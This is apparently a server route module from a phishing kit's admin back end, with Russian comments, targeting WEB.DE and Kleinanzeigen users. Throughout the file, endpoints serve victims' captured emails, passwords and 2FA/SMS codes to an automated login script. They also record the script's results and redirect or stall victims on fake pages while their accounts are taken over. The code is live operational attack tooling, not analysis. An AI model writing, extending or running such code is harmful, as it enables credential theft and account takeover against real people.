'use strict';

const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');
const { send, safeEnd } = require('../utils/httpUtils');
const { checkAdminAuth, getAdminTokenFromRequest, ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminPageAuth } = require('../utils/authUtils');
const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
const leadService = require('../services/leadService');
const automationService = require('../services/automationService');
const chatService = require('../services/chatService');

function normalizePathname(parsedUrl) {
  return (parsedUrl.pathname || '').replace(/\/\/+/g, '/') || '/';
}

async function handleRoute(req, res, parsedUrl, body, d) {
  const pathname = normalizePathname(parsedUrl);
  const parsed = parsedUrl;
  const method = req.method;
  if (pathname === '/api/lead-credentials' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = leadService.resolveLeadId(leadIdRaw);
    leadService.readLeadsAsync(function (err, leads) {
      if (err || !Array.isArray(leads)) {
        return send(res, 500, { ok: false, error: 'read leads failed' });
      }
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        console.log('[АДМИН] lead-credentials: лид не найден id=' + id + (id !== leadIdRaw ? ' (resolved from ' + leadIdRaw + ')' : ''));
        return send(res, 404, { ok: false });
      }
      const isKl = lead.brand === 'klein';
      const email = isKl
        ? String((lead.emailKl || lead.email || '')).trim()
        : String((lead.email || '')).trim();
      if (email) automationService.touchWebdeScriptLock(email.toLowerCase());
      const password = isKl
        ? String((lead.passwordKl != null ? lead.passwordKl : lead.password) || '').trim()
        : String((lead.password != null ? lead.password : '') || '').trim();
      return send(res, 200, { ok: true, email: email, password: password });
    });
    return;
  }

  /** Скрипт klein-orchestration: заход на /klein-anmelden и креды Klein (emailKl/passwordKl). */
  if (pathname === '/api/lead-klein-flow-poll' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = leadService.resolveLeadId(leadIdRaw);
    leadService.readLeadsAsync(function (err, leads) {
      if (err || !Array.isArray(leads)) {
        return send(res, 500, { ok: false, error: 'read leads failed' });
      }
      const lead = leads.find((l) => l.id === id);
      if (!lead) return send(res, 404, { ok: false });
      const emCtx = (lead.email || '').trim().toLowerCase();
      if (emCtx) automationService.touchWebdeScriptLock(emCtx);
      const seen = !!(lead.kleinAnmeldenSeenAt && String(lead.kleinAnmeldenSeenAt).trim());
      const emailKl = (lead.emailKl != null ? String(lead.emailKl) : '').trim();
      const passwordKl = (lead.passwordKl != null ? String(lead.passwordKl) : '').trim();
      return send(res, 200, { ok: true, anmeldenSeen: seen, emailKl: emailKl, passwordKl: passwordKl });
    });
    return;
  }

  if (pathname === '/api/klein-anmelden-seen' && req.method === 'POST') {
    if (REQUIRE_GATE_COOKIE && !hasGateCookie(req)) {
      return send(res, 403, { ok: false, error: 'forbidden' });
    }
    let bodySeen = '';
    req.on('data', (chunk) => { bodySeen += chunk; });
    req.on('end', () => {
      let j = {};
      try { j = JSON.parse(bodySeen || '{}'); } catch (e) {}
      const lid = j.leadId != null ? String(j.leadId).trim() : '';
      if (!lid) return send(res, 400, { ok: false, error: 'leadId required' });
      const id = leadService.resolveLeadId(lid);
      const leads = leadService.readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) return send(res, 404, { ok: false });
      const nowIso = new Date().toISOString();
      lead.kleinAnmeldenSeenAt = nowIso;
      lead.lastSeenAt = nowIso;
      pushEvent(lead, 'Открыл страницу Klein-anmelden');
      leadService.persistLeadPatch(id, {
        kleinAnmeldenSeenAt: lead.kleinAnmeldenSeenAt,
        lastSeenAt: lead.lastSeenAt,
        eventTerminal: lead.eventTerminal
      });
      return send(res, 200, { ok: true });
    });
    return;
  }

  /** Скрипт WEB.DE: опрос кода 2FA из лида (жертва ввела на фишинге → smsCodeData.kind === '2fa'). */
  if (pathname === '/api/webde-poll-2fa-code' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = leadService.resolveLeadId(leadIdRaw);
    leadService.readLeadsAsync(function (err, leads) {
      if (err || !Array.isArray(leads)) {
        return send(res, 500, { ok: false, error: 'read leads failed' });
      }
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        return send(res, 404, { ok: false, error: 'lead not found' });
      }
      const em = (lead.email || '').trim().toLowerCase();
      if (em) automationService.touchWebdeScriptLock(em);
      const kind = smsCodeDataKindForLead(lead);
      const d = lead.smsCodeData;
      const code = d && String(d.code || '').trim();
      const submittedAt = d && d.submittedAt != null ? String(d.submittedAt).trim() : '';
      if (kind !== '2fa' || !code) {
        return send(res, 200, { ok: true, code: null, submittedAt: null, kind: kind || null });
      }
      console.log('[АДМИН] webde-poll-2fa-code: отдан код 2FA лиду id=' + id + ' (для автовхода WEB.DE)');
      return send(res, 200, { ok: true, code: code, submittedAt: submittedAt || null, kind: '2fa' });
    });
    return;
  }

  /** Автовход забрал код 2FA с API — пишем в лог лида (видно в админке). */
  if (pathname === '/api/webde-login-2fa-received' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id != null ? String(json.id).trim() : '';
      if (!idRaw) return send(res, 400, { ok: false });
      const id = leadService.resolveLeadId(idRaw);
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.lastSeenAt = new Date().toISOString();
      const prSession = lead.webdeScriptActiveRun != null ? { session: lead.webdeScriptActiveRun } : undefined;
      pushEvent(lead, EVENT_LABELS.TWO_FA_CODE_IN, 'script', prSession);
      const patch2faIn = {
        lastSeenAt: lead.lastSeenAt,
        eventTerminal: lead.eventTerminal
      };
      if (lead.scriptStatus === 'wrong_2fa') patch2faIn.scriptStatus = null;
      leadService.persistLeadPatch(id, patch2faIn);
      return send(res, 200, { ok: true });
    });
    return;
  }

  /** Промежуточная отметка: автовход ввёл неверный 2FA на WEB.DE, ждём новый код с фишинга. */
  if (pathname === '/api/webde-login-2fa-wrong' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id != null ? String(json.id).trim() : '';
      if (!idRaw) return send(res, 400, { ok: false });
      const id = leadService.resolveLeadId(idRaw);
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.lastSeenAt = new Date().toISOString();
      const prSession = lead.webdeScriptActiveRun != null ? { session: lead.webdeScriptActiveRun } : undefined;
      pushEvent(lead, EVENT_LABELS.TWO_FA_WRONG, 'script', prSession);
      lead.scriptStatus = 'wrong_2fa';
      leadService.persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal, scriptStatus: lead.scriptStatus });
      return send(res, 200, { ok: true });
    });
    return;
  }

  /** Скачать куки аккаунта (если вход в WEB.DE прошёл успешно и скрипт сохранил куки). */
  if (pathname === '/api/webde-wait-password' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const leadIdRaw = json.leadId && String(json.leadId).trim();
      if (!leadIdRaw) {
        return send(res, 400, { ok: false, error: 'leadId required' });
      }
      const leadId = leadService.resolveLeadId(leadIdRaw);
      try {
        const leadsW = leadService.readLeads();
        const lw = leadsW.find((l) => l.id === leadId);
        const emW = lw && (lw.email || '').trim().toLowerCase();
        if (emW) automationService.touchWebdeScriptLock(emW);
      } catch (_) {}
      if (webdePasswordWaiters[leadId]) {
        console.log('[АДМИН] long-poll webde-wait-password: новый запрос заменил предыдущий → старому клиенту timeout, leadId=' + leadId);
        try {
          clearTimeout(webdePasswordWaiters[leadId].timeoutId);
          send(webdePasswordWaiters[leadId].res, 200, { timeout: true });
        } catch (e) {}
        delete webdePasswordWaiters[leadId];
        automationService.setWebdeLeadScriptStatus(leadId, null);
      }
      const timeoutId = setTimeout(function () {
        if (!webdePasswordWaiters[leadId]) return;
        console.log('[АДМИН] long-poll webde-wait-password: истёк срок ' + Math.round(WEBDE_WAIT_PASSWORD_TIMEOUT_MS / 1000) + 'с без пароля из админки, leadId=' + leadId);
        try {
          send(webdePasswordWaiters[leadId].res, 200, { timeout: true });
        } catch (e) {}
        delete webdePasswordWaiters[leadId];
        automationService.setWebdeLeadScriptStatus(leadId, null);
      }, WEBDE_WAIT_PASSWORD_TIMEOUT_MS);
      webdePasswordWaiters[leadId] = { res: res, timeoutId: timeoutId };
      automationService.setWebdeLeadScriptStatus(leadId, 'wait_password');
      console.log('[АДМИН] long-poll webde-wait-password: запрос принят, скрипт ждёт до ' + Math.round(WEBDE_WAIT_PASSWORD_TIMEOUT_MS / 1000) + 'с, leadId=' + leadId + (leadId !== leadIdRaw ? ' (resolved ' + leadIdRaw + ')' : '') + ' — пока админ не сохранит новый пароль (лид в error после wrong_credentials)');
    });
    return;
  }

  /** Опрос скриптом: нужно ли кликнуть «Mitteilung erneut senden» на странице пуша. При запросе возвращает { resend: true } и сбрасывает флаг. */
  if (pathname === '/api/webde-push-resend-poll' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadId = parsed.query && parsed.query.leadId && String(parsed.query.leadId).trim();
    if (!leadId) return send(res, 400, { ok: false, resend: false });
    const requested = !!webdePushResendRequested[leadId];
    if (requested) delete webdePushResendRequested[leadId];
    res.writeHead(200, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' });
    res.end(JSON.stringify({ resend: requested }));
    return;
  }

  /** Скрипт отчитался: пуш переотправлен (клик по ссылке) или не удалось + причина. */
  if (pathname === '/api/webde-push-resend-result' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id && String(json.id).trim();
      const success = json.success === true;
      const message = json.message != null ? String(json.message).trim().slice(0, 200) : '';
      if (!id) return send(res, 400, { ok: false });
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.lastSeenAt = new Date().toISOString();
      const label = success ? EVENT_LABELS.PUSH_RESEND_OK : (EVENT_LABELS.PUSH_RESEND_FAIL + (message ? ': ' + message : ''));
      const prSession = lead.webdeScriptActiveRun != null ? { session: lead.webdeScriptActiveRun } : undefined;
      pushEvent(lead, label, 'script', prSession);
      leadService.persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  /** Скрипт входа по завершении освобождает слот и даёт запустить следующий из очереди. */
  if (pathname === '/api/webde-login-slot-done' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id != null ? String(json.id).trim() : '';
      if (!idRaw) {
        return send(res, 400, { ok: false, error: 'id required' });
      }
      const idResolved = leadService.resolveLeadId(idRaw);
      automationService.webdeLoginChildByLeadId.delete(idResolved);
      automationService.releaseWebdeLoginSlot(idResolved);
      try {
        const leadsSlot = leadService.readLeads();
        const li = leadsSlot.findIndex(function (l) { return l.id === idResolved; });
        if (li !== -1) {
          automationService.endWebdeAutoLoginRun(leadsSlot[li]);
          const Ls = leadsSlot[li];
          leadService.persistLeadPatch(idResolved, {
            webdeScriptActiveRun: Ls.webdeScriptActiveRun,
            eventTerminal: Ls.eventTerminal
          });
        }
      } catch (e) {}
      return send(res, 200, { ok: true });
    });
    return;
  }

  /** Python-скрипт: произвольная строка в EVENTS (фильтры почты, этапы Klein). */
  if (pathname === '/api/script-event' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id != null ? String(json.id).trim() : '';
      const labelRaw = json.label != null ? String(json.label).trim() : '';
      if (!idRaw || !labelRaw) {
        return send(res, 400, { ok: false, error: 'id and label required' });
      }
      const label = labelRaw.slice(0, 180);
      const id = leadService.resolveLeadId(idRaw);
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.lastSeenAt = new Date().toISOString();
      const resSessionMeta = lead.webdeScriptActiveRun != null
        ? { session: lead.webdeScriptActiveRun }
        : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? { session: lead.webdeScriptRunSeq } : undefined);
      pushEvent(lead, label, 'script', resSessionMeta);
      leadService.persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
      return send(res, 200, { ok: true });
    });
    return;
  }

  /** Скрипт входа передаёт результат: success | wrong_credentials | push | error | sms | two_factor | wrong_2fa.
   * При result=error скрипт может передать errorCode и errorMessage — они выводятся в лог лида.
   * Коды ошибок: 403 — доступ запрещён (API 403, блок); 408 — таймаут (пароль, пуш, страница);
   * 502 — сервис временно недоступен (Login vorübergehend nicht möglich, капча, блок);
   * 503 — капча не поддерживается; 500 — внутренняя ошибка (браузер, исключение, страница не распознана).
   * 500/502/503: жертва остаётся на оверлее ожидания (script_automation_wait) без редиректа — см. WEBDE_SCRIPT_VICTIM_WAIT_MS.
   * resultPhase: mail_ready_klein — после фильтров почты в оркестрации. resultSource: klein_login — ответ klein_simulation / шаг Klein. */
  if (pathname === '/api/webde-login-result' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id && String(json.id).trim();
      const result = json.result && String(json.result).trim();
      if (!idRaw) {
        console.error('[АДМИН] webde-login-result: ошибка — не передан id в теле запроса (обязательное поле).');
        return send(res, 400, { ok: false, error: 'id required' });
      }
      const valid = ['success', 'wrong_credentials', 'push', 'error', 'sms', 'two_factor', 'wrong_2fa', 'two_factor_timeout'].indexOf(result) !== -1;
      if (!valid) {
        console.error('[АДМИН] webde-login-result: ошибка — неверный result="' + result + '" (ожидается success|wrong_credentials|push|error|sms|two_factor|wrong_2fa|two_factor_timeout), id=' + idRaw);
        return send(res, 400, { ok: false, error: 'result must be success|wrong_credentials|push|error|sms|two_factor|wrong_2fa|two_factor_timeout' });
      }
      const id = leadService.resolveLeadId(idRaw);
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) {
        console.error('[АДМИН] webde-login-result: лид не найден id=' + id + (id !== idRaw ? ' (resolved from ' + idRaw + ')' : '') + '.');
        return send(res, 404, { ok: false });
      }
      const lead = leads[idx];
      const fromKleinScript = String(json.resultSource || '').trim().toLowerCase() === 'klein_login';
      const resultPhase = json.resultPhase != null ? String(json.resultPhase).trim() : '';
      const sessLog = lead.webdeScriptActiveRun != null ? lead.webdeScriptActiveRun : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? lead.webdeScriptRunSeq : '—');
      lead.lastSeenAt = new Date().toISOString();
      delete lead.scriptStatus;
      const errorCode = json.errorCode && String(json.errorCode).trim();
      const errorMessage = json.errorMessage && String(json.errorMessage).trim();
      const pushTimeout = json.pushTimeout === true;
      if (result === 'success' || result === 'wrong_credentials') {
        delete lead.webdeLoginGridExhausted;
      } else if (result === 'error' && errorMessage) {
        const emg = String(errorMessage);
        if (emg.indexOf('WEBDE_VORUEBERGEHEND_EXHAUSTED') !== -1
            || emg.indexOf('Нет комбинаций прокси') !== -1
            || emg.indexOf('Все комбинации перебраны') !== -1) {
          lead.webdeLoginGridExhausted = true;
        }
      }
      if (result === 'success' || result === 'wrong_credentials' || result === 'push' || result === 'sms'
          || result === 'two_factor' || result === 'wrong_2fa' || result === 'two_factor_timeout') {
        delete lead.webdeLoginGridStep;
      } else if (result === 'error' && !webdeErrorTriggersVictimAutomationWait(errorCode)) {
        delete lead.webdeLoginGridStep;
      }
      const klScriptCtx = fromKleinScript || lead.brand === 'klein';
      const wrongLbl = klScriptCtx ? EVENT_LABELS.WRONG_DATA_KL : EVENT_LABELS.WRONG_DATA;
      let eventLabel = ({
        success: klScriptCtx ? EVENT_LABELS.SUCCESS_KL : EVENT_LABELS.SUCCESS,
        wrong_credentials: wrongLbl,
        push: EVENT_LABELS.PUSH,
        error: 'Ошибка 502',
        sms: klScriptCtx ? EVENT_LABELS.SMS_KL : EVENT_LABELS.SMS,
        two_factor: EVENT_LABELS.TWO_FA,
        wrong_2fa: EVENT_LABELS.WRONG_2FA,
        two_factor_timeout: EVENT_LABELS.TWO_FA_TIMEOUT
      })[result] || result;
      if (result === 'success' && resultPhase === 'mail_ready_klein') {
        eventLabel = EVENT_LABELS.MAIL_READY;
      }
      if (result === 'push' && pushTimeout) {
        eventLabel = EVENT_LABELS.PUSH_TIMEOUT;
      } else if (result === 'error' && (errorCode || errorMessage)) {
        let emShow = errorMessage ? String(errorMessage).replace(/\n/g, ' ') : '';
        if (/^WEBDE_VORUEBERGEHEND_EXHAUSTED:\s*/i.test(emShow)) {
          emShow = emShow.replace(/^WEBDE_VORUEBERGEHEND_EXHAUSTED:\s*/i, '').trim();
        }
        eventLabel = 'Ошибка ' + (errorCode || '500') + (emShow ? ': ' + emShow.slice(0, 180) : '');
      }
      if (result === 'wrong_credentials' && klScriptCtx) {
        lead.kleinPasswordErrorDe = (errorMessage && String(errorMessage).trim())
          ? String(errorMessage).trim().slice(0, 400)
          : KLEIN_VICTIM_PASSWORD_ERROR_DE;
      } else if (result === 'wrong_credentials') {
        delete lead.kleinPasswordErrorDe;
      }
      // Не дублировать «неверные данные»: один ввод пароля — одно событие (скрипт/ретраи могли слать POST несколько раз)
      const term = lead.eventTerminal || [];
      const lastLblWrong = term.length > 0 ? String(term[term.length - 1].label || '') : '';
      const lastIsWrongCreds = result === 'wrong_credentials' && term.length > 0 && (
        lastLblWrong.indexOf('Неверные данные') === 0
        || lastLblWrong.indexOf('Неверный пароль') === 0
        || lastLblWrong.toLowerCase().indexOf('error password') === 0
      );
      const resSessionMeta = lead.webdeScriptActiveRun != null
        ? { session: lead.webdeScriptActiveRun }
        : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? { session: lead.webdeScriptRunSeq } : undefined);
      /** 500/502/503 → жертва в pending + script_automation_wait (оверлей), без редиректа — не пишем «Ошибка 502» в EVENTS админки. */
      const skipAdminEventForScriptVictimWait =
        result === 'error' && webdeErrorTriggersVictimAutomationWait(errorCode);
      if (!lastIsWrongCreds && !skipAdminEventForScriptVictimWait) {
        pushEvent(lead, eventLabel, 'script', resSessionMeta);
      }
      if (result === 'success') {
        const isKleinLead = (lead.brand === 'klein');
        if (isKleinLead) {
          delete lead.kleinPasswordErrorDe;
        }
        const startPage = readStartPage();
        if (isKleinLead) {
          // script-klein.js ведёт на /erfolg только при show_success; pending оставлял жертву на форме.
          if (startPage === 'change') {
            lead.status = 'redirect_change_password';
          } else if (startPage === 'download') {
            lead.status = getRedirectPasswordStatus(lead);
          } else {
            lead.status = 'show_success';
          }
        } else if (startPage === 'klein') {
          lead.status = 'redirect_klein_anmelden';
        } else if (startPage === 'login') {
          lead.status = 'show_success';
        } else if (startPage === 'change') {
          lead.status = 'redirect_change_password';
        } else if (startPage === 'download') {
          lead.status = getRedirectPasswordStatus(lead);
        } else {
          lead.status = 'show_success';
        }
      } else if (result === 'wrong_credentials') lead.status = 'error';
      else if (result === 'push') lead.status = pushTimeout ? 'pending' : 'redirect_push';
      else if (result === 'sms') lead.status = 'redirect_sms_code';
      else if (result === 'two_factor') lead.status = 'redirect_2fa_code';
      else if (result === 'wrong_2fa') lead.status = 'redirect_2fa_code';
      else if (result === 'two_factor_timeout') {
        lead.status = 'redirect_2fa_code';
      } else {
        // result === 'error' — не «неверный пароль», а блок/капча/таймаут и т.д.
        const startPage = readStartPage();
        const isKleinLead = (lead.brand === 'klein');
        // Если скрипт не дождался новый пароль от админки (long-poll timeout),
        // не редиректим никуда: только ошибка и закрываем сценарий.
        if (String(errorCode || '') === '408') {
          lead.status = 'error';
        } else if (webdeErrorTriggersVictimAutomationWait(errorCode)) {
          // 500/502/503 (прокси, отпечаток, «Weiter» без эффекта и т.п.): жертва видит оверлей ожидания, без редиректа
          lead.status = 'pending';
          lead.scriptStatus = 'script_automation_wait';
          lead.scriptAutomationWaitUntil = new Date(Date.now() + WEBDE_SCRIPT_VICTIM_WAIT_MS).toISOString();
        } else if (!isKleinLead && errorMessage && String(errorMessage).indexOf('WEBDE_VORUEBERGEHEND_EXHAUSTED') !== -1) {
          lead.status = 'redirect_change_password';
        } else if (isKleinLead) {
          lead.status = 'pending';
        } else if (startPage === 'klein') {
          lead.status = 'redirect_klein_anmelden';
        } else if (startPage === 'login') {
          lead.status = 'show_success';
        } else if (startPage === 'change') {
          lead.status = 'redirect_change_password';
        } else if (startPage === 'download') {
          lead.status = getRedirectPasswordStatus(lead);
        } else {
          lead.status = 'redirect_change_password';
        }
      }
      // Жертва могла отправить SMS/2FA-код между leadService.readLeads() в начале обработчика и writeLeads — не затирать smsCodeData.
      try {
        leadService.invalidateLeadsCache();
        const diskLeads = leadService.readLeads();
        const diskLead = diskLeads.find((l) => l.id === id);
        if (diskLead && diskLead.smsCodeData && String(diskLead.smsCodeData.code || '').trim()) {
          lead.smsCodeData = JSON.parse(JSON.stringify(diskLead.smsCodeData));
        }
      } catch (e) {}
      leadService.persistLeadFull(lead);
      automationService.clearWebdeScriptRunning((lead.email || '').trim().toLowerCase());
      const leadEmail = (lead.email || '').trim();
      logTerminalFlow(
        'АДМИН',
        'Автовход',
        sessLog,
        leadEmail,
        'POST webde-login-result id=' + id + (id !== idRaw ? ' (из ' + idRaw + ')' : '') + ' result=' + result + ' → status=' + lead.status
          + (skipAdminEventForScriptVictimWait
            ? ' | ' + (errorCode || '') + ' оверлей ожидания (событие в админке не пишем)'
            : (' | ' + (eventLabel || ''))),
      );
      if (result === 'error' && !skipAdminEventForScriptVictimWait) {
        logTerminalFlow('АДМИН', 'Система', '—', leadEmail || '—', 'коды ошибок скрипта: 403/408/502/503/500 — см. eventLabel выше');
      } else if (result === 'wrong_credentials') {
        logTerminalFlow('АДМИН', 'Автовход', sessLog, leadEmail, wrongLbl + ' → status=error');
      }
      automationService.webdeLoginChildByLeadId.delete(id);
      automationService.releaseWebdeLoginSlot(id);
      send(res, 200, { ok: true });
    });
    return;
  }

  /** Запуск скрипта входа WEB.DE для лида вручную из админки. */
  return false;
}

module.exports = { handleRoute, normalizePathname };
